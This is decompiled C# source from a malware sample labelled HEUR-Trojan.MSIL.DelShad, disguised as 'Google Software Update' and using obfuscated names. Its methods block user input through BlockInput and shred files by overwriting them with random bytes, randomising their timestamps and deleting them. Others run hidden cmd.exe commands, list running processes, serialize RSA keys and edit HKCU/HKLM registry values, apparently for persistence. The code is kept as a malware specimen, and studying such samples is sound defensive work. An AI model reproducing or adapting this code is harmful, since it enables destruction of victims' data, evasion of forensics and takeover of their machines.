// Decompiled with JetBrains decompiler
// Type: C3904355907.C4067256894
// Assembly: Google Software Update, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1ECCB2B4-E3D0-48EA-84ED-06938D43796B
// Assembly location: C:\Users\Administrateur\Downloads\toto\HEUR-Trojan.MSIL.DelShad.gen-b37761715d5a2405a3fa75abccaf6bb15b7298673aaad91a158725be3c518a87.exe

using \u003Cdion2ntty2ic0uyoe\u003E\u007B43570453\u002D3AD8\u002D4A5B\u002DB273\u002D83DF8156D820\u007D;
using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Xml.Serialization;

namespace C3904355907
{
  public class C4067256894
  {
    public const string C3554254475 = "C:\\Windows\\System32\\cmd.exe";

    [DllImport("user32.dll", EntryPoint = "BlockInput")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool C3554254475([MarshalAs(UnmanagedType.Bool)] bool _param0);

    public static string C3554254475([In] RSAParameters obj0)
    {
      StringWriter stringWriter = new StringWriter();
      new XmlSerializer(typeof (RSAParameters)).Serialize((TextWriter) stringWriter, (object) obj0);
      return stringWriter.ToString();
    }

    public static void C3554254475([In] string obj0, int _param1 = 5)
    {
      try
      {
        if (string.IsNullOrEmpty(obj0) || string.IsNullOrWhiteSpace(obj0) || !File.Exists(obj0))
          return;
        File.SetAttributes(obj0, FileAttributes.Normal);
        double num = Math.Ceiling((double) new FileInfo(obj0).Length / 512.0);
        byte[] buffer = new byte[512];
        FileStream fileStream = new FileStream(obj0, FileMode.Open);
        if (fileStream == null)
          return;
        for (int index1 = 0; index1 < _param1; ++index1)
        {
          fileStream.Position = 0L;
          for (int index2 = 0; (double) index2 < num; ++index2)
          {
            new Random().NextBytes(buffer);
            fileStream.Write(buffer, 0, buffer.Length);
          }
        }
        fileStream.SetLength(0L);
        fileStream.Close();
        Random random = new Random();
        DateTime dateTime = new DateTime(random.Next(2000, 2024), random.Next(1, 12), random.Next(1, 28), random.Next(1, 12), random.Next(1, 60), random.Next(1, 60));
        File.SetCreationTime(obj0, dateTime);
        File.SetLastAccessTime(obj0, dateTime);
        File.SetLastWriteTime(obj0, dateTime);
        File.SetCreationTimeUtc(obj0, dateTime);
        File.SetLastAccessTimeUtc(obj0, dateTime);
        File.SetLastWriteTimeUtc(obj0, dateTime);
        File.Delete(obj0);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public static RSAParameters C3554254475([In] string obj0) => (RSAParameters) new XmlSerializer(typeof (RSAParameters)).Deserialize((TextReader) new StringReader(obj0));

    public static string[] C3554254475()
    {
      List<string> stringList = new List<string>();
      foreach (Process process in Process.GetProcesses())
        stringList.Add(process.ProcessName);
      return stringList.ToArray();
    }

    public static string C3904355907([In] string obj0)
    {
      try
      {
        Process process = new Process();
        process.StartInfo = new ProcessStartInfo()
        {
          UseShellExecute = false,
          RedirectStandardOutput = true,
          FileName = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.iD(),
          Arguments = DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.JP() + obj0
        };
        process.Start();
        string end = process.StandardOutput.ReadToEnd();
        process.WaitForExit();
        return end;
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
        return (string) null;
      }
    }

    public static string C3554254475([In] string obj0, string _param1 = null)
    {
      string path2;
      do
      {
        path2 = Guid.NewGuid().ToString();
      }
      while (File.Exists(Path.Combine(obj0, path2)));
      return string.IsNullOrEmpty(_param1) || string.IsNullOrWhiteSpace(_param1) ? Path.Combine(obj0, path2) : Path.Combine(obj0, path2 + _param1);
    }

    public static void C3904355907([In] bool obj0) => C4067256894.C3554254475(obj0);

    public static void C3554254475(
      [In] string obj0,
      [In] List<string> obj1,
      [In] List<string> obj2,
      [In] string[] obj3)
    {
      if (string.IsNullOrEmpty(obj0) || obj1 == null || obj2 == null || obj3 == null || obj3 == null)
        return;
      StreamWriter streamWriter = new StreamWriter(obj0);
      int num = Math.Min(obj1.Count, Math.Min(obj2.Count, obj3.Length));
      for (int index = 0; index < num; ++index)
        streamWriter.WriteLine(obj1[index] + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.aj() + obj2[index] + DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.Jp() + obj3[index]);
    }

    public static bool C3554254475([In] int obj0, [In] string obj1, [In] string obj2)
    {
      RegistryKey registryKey = C4067256894.C3554254475(obj0, obj1);
      return registryKey != null && registryKey.GetValue(obj2) != null;
    }

    public static bool C3554254475([In] int obj0, [In] string obj1, [In] string obj2, [In] object obj3)
    {
      RegistryKey registryKey = C4067256894.C3554254475(obj0, obj1);
      if (registryKey == null)
        return false;
      object obj = registryKey.GetValue(obj2);
      return obj != null && obj == obj3;
    }

    public static void C3904355907([In] int obj0, [In] string obj1, [In] string obj2) => C4067256894.C3904355907(obj0, obj1, obj2, (object) null);

    public static void C3904355907([In] int obj0, [In] string obj1, [In] string obj2, [In] object obj3)
    {
      try
      {
        C4067256894.C1255198513(obj0, obj1, obj2, obj3);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public static void C1255198513([In] int obj0, [In] string obj1, [In] string obj2, [In] object obj3)
    {
      try
      {
        RegistryKey registryKey = C4067256894.C3554254475(obj0, obj1);
        if (registryKey == null)
          return;
        if (obj3 == null)
          registryKey.SetValue(obj2, (object) DC0DFFA6\u002DD07E\u002D4569\u002D8923\u002D61FED0540CB3.cz());
        else
          registryKey.SetValue(obj2, obj3);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    public static void C1255198513([In] int obj0, [In] string obj1, [In] string obj2)
    {
      try
      {
        RegistryKey registryKey = C4067256894.C3554254475(obj0, obj1);
        if (registryKey == null)
          return;
        registryKey.DeleteValue(obj2);
        registryKey.Close();
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message);
      }
    }

    private static RegistryKey C3554254475([In] int obj0, [In] string obj1)
    {
      if (obj0 == 0)
        return Registry.CurrentUser.OpenSubKey(obj1, true);
      return obj0 == 1 ? Registry.LocalMachine.OpenSubKey(obj1, true) : (RegistryKey) null;
    }
  }
}
